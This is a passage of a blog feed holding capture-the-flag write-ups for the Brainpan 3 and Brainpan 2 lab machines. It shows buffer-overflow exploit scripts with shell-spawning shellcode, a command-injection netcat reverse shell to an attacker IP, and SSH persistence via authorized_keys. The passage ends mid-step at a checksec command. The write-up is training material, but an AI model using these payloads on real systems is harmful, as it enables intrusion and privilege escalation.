+EBX: 0x41414141 (&#39;AAAA&#39;)
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0x0 
+EDI: 0x636e652e (&#39;.enc&#39;)
+EBP: 0x1 
+ESP: 0xbffff308 --&amp;gt; 0xb7e14a68 --&amp;gt; 0x1df7 
+EIP: 0xb7fb57e0 --&amp;gt; 0x0
+
+Stopped reason: SIGSEGV
+0xb7fb57e0 in _IO_wfile_jumps () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&amp;rsquo;s a start, but we don&amp;rsquo;t yet control EIP.  I tried it again, but with a longer key.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(python -c &#39;print &amp;quot;A&amp;quot; * 116 + &amp;quot; &amp;quot; + &amp;quot;B&amp;quot; * 100&#39;)
+
+EAX: 0x0 
+EBX: 0x41414141 (&#39;AAAA&#39;)
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0x0 
+EDI: 0x636e652e (&#39;.enc&#39;)
+EBP: 0x41414141 (&#39;AAAA&#39;)
+ESP: 0xbffff308 (&#39;A&#39; &amp;lt;repeats 100 times&amp;gt;)
+EIP: 0x41414141 (&#39;AAAA&#39;)
+
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Much more promising!  By using pattern create/offset I found that EIP gets overwritten after only 4 bytes, but the total string length still has to be 116 to trigger the overwrite.  Let&amp;rsquo;s target EIP specifically.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import struct
+
+buf = &amp;quot;AAAA&amp;quot;            # first junk
+buf += &amp;quot;BBBB&amp;quot;           # eip
+buf += &amp;quot;C&amp;quot; * (116-8)    # padding to reach 116
+buf += &amp;quot; &amp;quot;
+buf += &amp;quot;D&amp;quot; * 100        # key
+
+print buf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(./cryptor.py)
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Question now, is where to jump to?  Well it turns out that the data for &amp;lsquo;key&amp;rsquo; is always stored in the same place in memory.  Something we can verify in gdb just by searching for our input.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ find &#39;DDDD&#39;
+Searching for &#39;DDDD&#39; in: None ranges
+Found 50 results, display max 50 items:
+cryptor : 0x804a080 (&#39;D&#39; &amp;lt;repeats 100 times&amp;gt;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No matter how many times you re-run the binary, the data is always located at &lt;code&gt;0x804a080&lt;/code&gt;.  This means we can place shellcode here and jump to it quite reliably - something which I again tested with SIGTRAPs.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import struct
+
+def p(x):
+        return struct.pack(&#39;&amp;lt;L&#39;, x)
+
+buf = &amp;quot;AAAA&amp;quot;            # first junk
+buf += p(0x804a080)     # eip
+buf += &amp;quot;C&amp;quot; * (116-8)    # padding to reach 116
+buf += &amp;quot; &amp;quot;
+buf += &amp;quot;\xcc&amp;quot; * 100     # key
+
+print buf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGTRAP
+0x0804a081 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now smash some shellcode in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import struct
+
+def p(x):
+        return struct.pack(&#39;&amp;lt;L&#39;, x)
+
+buf = &amp;quot;AAAA&amp;quot;           # padding
+buf += p(0x804a080)     # key always stored here
+buf += &amp;quot;C&amp;quot; * 108        # junk to reach 116
+buf += &amp;quot; &amp;quot;
+buf += &amp;quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&amp;quot;
+
+print buf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I copied it across to brainpan3 using &lt;code&gt;xxd&lt;/code&gt; and ran it.  It can take a few attempts for it to work.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./cryptor $(./cryptor.py)
+Segmentation fault (core dumped)
+$ ./cryptor $(./cryptor.py)
+$ id
+uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan: 2 - Part 1</title>
+      <link>http://rastamouse.me/writeups/2014/brainpan-2-part-1/</link>
+      <pubDate>Sun, 01 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/brainpan-2-part-1/</guid>
+      <description>
+
+&lt;p&gt;Following the popularity of Brainpan 1, Brainpan 2 was released as a competition on VulnHub.  I didn&amp;rsquo;t take part, but since the VM remains on VulnHub, I had a go at it retrospectively.  The goal is to gain root access and obtain /root/flag.txt.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -p- -A 192.168.127.131
+  
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+1 service unrecognized despite returning data.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This output looked identical to Brainpan 1 - the same looking application on 9999 and a web server on 10000.  I connected to port 9999 with &lt;code&gt;netcat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-2/brainpan2.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So a little bit different to the original, since this is now asking for a login rather than a password.  I found a funny little easter egg by trying &lt;code&gt;shitstorm&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt; shitstorm
+Never gonna give you up Never gonna let you down Never gonna run around and desert you
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So without thining about it too much,  I guessed I would have to exploit this application in the same way as Brainpan 1.  I just popped &lt;code&gt;192.168.127.131:10000/bin/&lt;/code&gt; into my web browser and downloaded the &lt;code&gt;brainpan.exe&lt;/code&gt; file which was in there.  I then tried running it in &lt;code&gt;wine&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# wine brainpan.exe 
+wine: Bad EXE format for Z:\root\brainpan\2\brainpan.exe.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A bit unexpected&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# file brainpan.exe
+brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &amp;quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it&amp;rsquo;s actually a JPEG.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-2/mario.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Gah, trolled&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;I ran &lt;code&gt;nikto&lt;/code&gt; and &lt;code&gt;wfuzz&lt;/code&gt; against the web service, but nothing popped except the &lt;code&gt;/bin/&lt;/code&gt; directory, so I turned my attention back to the app on 9999.&lt;/p&gt;
+
+&lt;h2 id=&#34;command-injection:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;Command Injection&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt; GUEST
+                          ACCESS GRANTED
+  
+                             *  *  *  *                                
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+    TYPE &amp;quot;TELL ME MORE&amp;quot; FOR A LIST OF COMMANDS.  
+                             *  *  *  *
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I spent some time playing around with the commands.  The &lt;code&gt;HELP&lt;/code&gt; commands prints a man page for the application, which reveals a &lt;code&gt;DEBUG&lt;/code&gt; account also exists.  This enables some extra commands in the application, but nothing more which helped me at this point.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt; FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
+  
+&amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: notes.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is quite a lot of information here, which come in useful at different parts of the challenge.  The most pertinent at this point are the following lines:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;puck:
+Easiest way to display file contents is to just use popen(). Eg:
+popen(&amp;quot;/bin/ls&amp;quot;, &amp;quot;r&amp;quot;);
+popen(&amp;quot;/bin/man ./brainpan.7&amp;quot;, &amp;quot;r&amp;quot;);
+popen(&amp;quot;/usr/bin/top&amp;quot;, &amp;quot;r&amp;quot;);
+etc...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If this is how the application is working, then these commands are vulnerable to command injection.  The &lt;code&gt;VIEW&lt;/code&gt; command takes user input for the filename to display, so I assumed the backend code would look something like:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;popen(&amp;quot;cat &amp;quot;, + filename);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;With no sanitiztion, it would allow me to chain new commands as part of the filename input.  I did a quick test, using a &lt;code&gt;;&lt;/code&gt; and the &lt;code&gt;id&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: ; id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Cool.  I was then able to take this further to gain a &lt;code&gt;netcat&lt;/code&gt; shell on the system.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;ENTER FILE TO DOWNLOAD: ; nc 192.168.127.127 4444 -e &#39;/bin/sh&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;ssh-foothold:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;SSH Foothold&lt;/h2&gt;
+
+&lt;p&gt;For the sake of a coherent write-up, I&amp;rsquo;m going to include maintaining SSH access to the system.  When I originally exploited Brainpan 2, I didn&amp;rsquo;t do this until way later on, because I was getting annoyed at losing my remote shells due to making mistakes etc and then having to re-exploit to re-gain access.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;netstat -antp
+Active Internet connections (servers and established)
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
+  
+ps aux | grep sshd
+root      2181  0.0  0.2   6464  1056 ?        Ss   12:49   0:00 /usr/sbin/sshd
+  
+cat /etc/ssh/sshd_config
+ListenAddress 127.0.1.1
+Port 2222
+  
+cat /etc/hosts
+127.0.1.1   brainpan2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;SSH has been setup up in quite an usual way - listening on an internal address on an alternate port.  I set up a reverse SSH connection back to my Kali machine.  This allows me to bind &lt;code&gt;127.0.1.1:2222&lt;/code&gt; on brainpan2 to &lt;code&gt;127.0.0.1:2222&lt;/code&gt; on Kali and initiate a forward SSH connection, back through the reverse connection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+cd /home/anansi/.ssh
+echo &amp;quot;ssh-rsa AAAA[...snip...]MQGB root@kali&amp;quot; &amp;gt;&amp;gt; authorized_keys
+anansi@brainpan2:/opt/brainpan$ ssh root @ 192.168.127.127 -R 2222:127.0.1.1:2222
+root @ 192.168.127.127&#39;s password:
+root@kali:~#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On my Kali VM:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# netstat -antp
+tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      3986/3
+  
+root@kali:~# ssh anansi @ 127.0.0.1 -p 2222
+anansi@brainpan2:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;more-trolls:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;More Trolls?&lt;/h2&gt;
+
+&lt;p&gt;With convenient access to the system, I carried out some more enumeration.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat /etc/passwd
+root:x:104:106:root:/root:/bin/bash
+root :x:0:0:root:/var/root:/bin/bash
+anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
+puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
+reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
+  
+cat /etc/group
+root:x:106:
+root :x:0:
+anansi:x:1000:
+puck:x:1001:
+reynard:x:1002:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Having a look through the users and groups, I noticed that there appeared to be two root users (uid 0 and 106).  It seems that the real root account has been renamed to contain a space at the end.  In addition to this, there&amp;rsquo;s a SUID binary available that appears to be owned by root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;find / -perm -4000 -type f 2&amp;gt;/dev/null
+/home/reynard/msg_root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;anansi@brainpan2:~$ ls -l /home/reynard/msg_root
+-rwsr-xr-x 1 root root 8999 Nov  6  2013 /home/reynard/msg_root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m going to assume that exploiting this binary won&amp;rsquo;t give me real root access.  But I couldn&amp;rsquo;t find any other route to gain further access to the system, so I just went with it&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;msg-root:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;msg_root&lt;/h2&gt;
+
+&lt;p&gt;I ran this binary quickly to see what it would do.  It appears to be an application to send a message to another user on the system.  It takes two inputs, a message and the destination user.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;anansi@brainpan2:/home/reynard$ ./msg_root 
+usage: msg_root username message
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I copied the binary to my Kali machine to do some proper analysis.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# strings msg_root 
+strcpy
+strncpy
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seems as though one of the inputs is copied with the vulnerable strcpy function, and is likely to be vulnerable to a buffer overflow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# ./msg_root `python -c &#39;print (&amp;quot;A&amp;quot; * 100)&#39;` a
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I managed to crash it pretty quickly, so now to load it up in GDB.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(gdb) r `python -c &#39;print (&amp;quot;A&amp;quot; * 500)&#39;` a
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0x41414141   1094795585
+ecx            0x61 97
+edx            0xbffff6fe   -1073744130
+ebx            0xb7fbeff4   -1208225804
+esp            0xbffff2b4   0xbffff2b4
+ebp            0xbffff2d8   0xbffff2d8
+esi            0x0  0
+edi            0x0  0
+eip            0x41414141   0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I found that &lt;code&gt;EIP&lt;/code&gt; is overwritten at just &lt;code&gt;14 bytes&lt;/code&gt;.  I sent a larger buffer of A&amp;rsquo;s, B&amp;rsquo;s and C&amp;rsquo;s to try and get a better understanding of what is getting overwritten on the stack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(gdb) r `python -c &#39;print (&amp;quot;A&amp;quot; * 14) + (&amp;quot;B&amp;quot; * 4) + (&amp;quot;C&amp;quot; * 482)&#39;` a
+  
+(gdb) i r
+eax            0x42424242   1111638594
+ecx            0x61 97
+edx            0xbffff6fe   -1073744130
+ebx            0xb7fbeff4   -1208225804
+esp            0xbffff2b4   0xbffff2b4
+ebp            0xbffff2d8   0xbffff2d8
+esi            0x0  0
+edi            0x0  0
+eip            0x42424242   0x42424242
+  
+(gdb) x/20x $esp
+0xbffff2b4: 0x0804872e  0xbffff2c6  0x0804a008  0x00000001
+0xbffff2c4: 0x4141f394  0x41414141  0x41414141  0x0804a008
+0xbffff2d4: 0x42424242  0xbffff2e8  0x0804877b  0xbffff508
+0xbffff2e4: 0xbffff6fd  0xbffff368  0xb7e75e46  0x00000003
+0xbffff2f4: 0xbffff394  0xbffff3a4  0xb7fe0860  0xb7ff6821
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seems that &lt;code&gt;EIP&lt;/code&gt; was pointing at &lt;code&gt;EAX&lt;/code&gt; as they are both getting overwritten by my B&amp;rsquo;s.  I can see a couple of A&amp;rsquo;s, but my C&amp;rsquo;s are nowhere to be found.  Even though I can control &lt;code&gt;EIP&lt;/code&gt;, where am I going to jump to if I can&amp;rsquo;t add anymore data to the stack&amp;hellip;?&lt;/p&gt;
+
+&lt;p&gt;I checked to see is ASLR was disabled on the system.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;anansi@brainpan2:/home/reynard$ cat /proc/sys/kernel/randomize_va_space 
+0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sweet - so it may be possible to insert shellcode as an environmental variable, and jump to that area of memory.  I first tried it out on my Kali box (disable ASLR with &lt;code&gt;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Write the shellcode to memory, including a small &lt;code&gt;NOP&lt;/code&gt; slide:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# export egg=`python -c &#39;print (&amp;quot;\x90&amp;quot; * 50) + &amp;quot;\xb8\x83\x64\xca\x02\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x11\x03\x42\x11\xe2\x76\x0e\xc1\x5a\xe1\x9d\xb3\x32\x3c\x41\xb5\x24\x56\xaa\xb6\xc2\xa6\xdc\x17\x71\xcf\x72\xe1\x96\x5d\x63\xf9\x58\x61\x73\xd5\x3a\x08\x1d\x06\xc8\xa2\xe1\x0f\x7d\xbb\x03\x62\x01&amp;quot;&#39;`
+
+
+root@kali:~/brainpan/2# ./findaddr 
+egg =&amp;gt; 0xbffffcfb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Time to test it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# ./msg_root `python -c &#39;print (&amp;quot;A&amp;quot; * 14) + &amp;quot;\xfb\xfc\xff\xbf&amp;quot;&#39;` a
+#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Woop - the &lt;code&gt;#&lt;/code&gt; character confims a new &lt;code&gt;/bin/sh&lt;/code&gt; shell has been spawned.  I repeated the process on brainpan2 and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;anansi@brainpan2:/home/reynard$ ./msg_root `python -c &#39;print (&amp;quot;A&amp;quot; * 14) + &amp;quot;\x97\xfe\xff\xbf&amp;quot;&#39;` a
+$ id; whoami
+uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Naturally the first instinct is to run over to the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -la /root/flag.txt
+-rw------- 1 root  root  461 Nov  5  2013 /root/flag.txt
+
+$ cat /root/flag.txt
+cat: /root/flag.txt: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Gaba-whaaa&amp;hellip;..?  There&amp;rsquo;s another file in &lt;code&gt;/root&lt;/code&gt; that can be read however.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rw-------  1 root  root   245 Nov  5  2013 whatif.txt
+  
+$ cat /root/whatif.txt
+  
+       WHAT IF I TOLD YOU
+              ___
+            /     \ 
+           | ______\
+          (, \_/ \_/
+           |   ._. |
+           \   --- /
+           /`-.__.&#39;
+      .---&#39;`-.___|\___
+     /                `.
+       YOU ARE NOT ROOT?
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Haha - so we are actually root uid 106, rather than the real root.  Another good troll by superkojiman, but at least I saw this one coming ;)&lt;/p&gt;
+
+&lt;p&gt;All is not lost however, as this user, I can now access another SUID binary found in &lt;code&gt;/opt/old/brainpan-1.8&lt;/code&gt;.  I&amp;rsquo;ll cover this in Part 2&amp;hellip;&lt;/p&gt;
+
+&lt;h3 id=&#34;findaddr-c:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;findaddr.c&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+   
+int main(void)
+{
+  char *s = getenv(&amp;quot;egg&amp;quot;);
+  printf(&amp;quot;egg =&amp;gt; %p\n&amp;quot;, s);
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan: 2 - Part 2</title>
+      <link>http://rastamouse.me/writeups/2014/brainpan-2-part-2/</link>
+      <pubDate>Sun, 01 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/brainpan-2-part-2/</guid>
+      <description>
+
+&lt;h2 id=&#34;brainpan-1-8:57e48663af901e7c94c0472675ef84ed&#34;&gt;brainpan-1.8&lt;/h2&gt;
+
+&lt;p&gt;It was mentioned in the &lt;code&gt;notes.txt&lt;/code&gt; file that &lt;code&gt;brainpan-1.8&lt;/code&gt; works from a configuration file.  It also contains the following line:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;- Discovered buffer overflow in the command prompt, fixed as of version 2.0
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I didn&amp;rsquo;t understand this line too well, at least it wasn&amp;rsquo;t clear to me.  But I took it to mean there was a buffer overflow vulnerability which is still present in 1.8.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -la
+-rwsr-xr-x 1 puck  puck  17734 Nov  4  2013 brainpan-1.8.exe
+-rw-r--r-- 1 puck  puck   1227 Nov  5  2013 brainpan.7
+-rw-rw-rw- 1 puck  staff    27 Nov  5  2013 brainpan.cfg
+  
+$ cat brainpan.cfg
+port=9333
+ipaddr=127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I downloaded brainpan-1.8.exe and brainpan.cfg to my Kali VM.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# file brainpan-1.8.exe 
+brainpan-1.8.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xcce373746445bee7531358c8b349018de08ec1f3, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Even though it has a &lt;code&gt;.exe&lt;/code&gt; extension, it&amp;rsquo;s actually an &lt;code&gt;ELF&lt;/code&gt; executable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# strings brainpan-1.8.exe 
+
+[...snip...]
+
+socket
+strcpy
+exit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are is only one instance of strcpy in the binary - adjacent to a socket function.  I&amp;rsquo;ve no idea if this is a valid assumption, but I figured this meant the vulnerable function would be part of the formation of that socket.  The configuration file handled the bind address and port and provides an easy method of manipulating the input to the application.&lt;/p&gt;
+
+&lt;p&gt;I first tried fuzzing the port parameter.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# python -c &#39;print &amp;quot;port=&amp;quot; + (&amp;quot;A&amp;quot; * 100) + &amp;quot;\n&amp;quot; + &amp;quot;ipaddr=127.0.0.1&amp;quot;&#39; &amp;gt; brainpan.cfg  
+  
+root@kali:~/brainpan/2# ./brainpan-1.8.exe 
+port = 0
+ipaddr = 127.0.0.1
+[!] port not configured
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No dice.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# python -c &#39;print &amp;quot;port=0&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;ipaddr=&amp;quot; + (&amp;quot;A&amp;quot; * 100)&#39; &amp;gt; brainpan.cfg 
+  
+root@kali:~/brainpan/2# ./brainpan-1.8.exe 
+port = 0
+ipaddr = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�_
+[!] port not configured
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Wow, excellent.&lt;/p&gt;
+
+&lt;h2 id=&#34;gdb:57e48663af901e7c94c0472675ef84ed&#34;&gt;GDB&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code&gt;EIP&lt;/code&gt; offset is &lt;code&gt;44 bytes&lt;/code&gt;.   A quick test to verify.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# python -c &#39;print &amp;quot;port=0&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;ipaddr=&amp;quot; + (&amp;quot;A&amp;quot; * 44) + (&amp;quot;B&amp;quot; * 4) + (&amp;quot;C&amp;quot; * 452)&#39; &amp;gt; brainpan.cfg 
+  
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+  
+(gdb) i r
+eax            0xffffffff   -1
+ecx            0xb7fa736c   -1208323220
+edx            0x18 24
+ebx            0xb7fa5ff4   -1208328204
+esp            0xbffff4e0   0xbffff4e0
+ebp            0x41414141   0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0x42424242   0x42424242
+  
+(gdb) x/50x $esp -20
+0xbffff4cc: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff4dc: 0x42424242  0x43434343  0x43434343  0x43434343
+0xbffff4ec: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff4fc: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff50c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff51c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff52c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff53c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff54c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff55c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff56c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff57c: 0x43434343  0x43434343  0x43434343  0x43434343
+0xbffff58c: 0x43434343  0x43434343
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking through the registers and memory stack, it appears as though I can overwrite &lt;code&gt;EBP&lt;/code&gt;, &lt;code&gt;EIP&lt;/code&gt; and a lot of the stack.  Overwriting &lt;code&gt;ESP&lt;/code&gt; is not useful to me however, as this binary has been compiled with &lt;code&gt;NX&lt;/code&gt; support.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/2# checksec --file brainpan-1.8.exe 
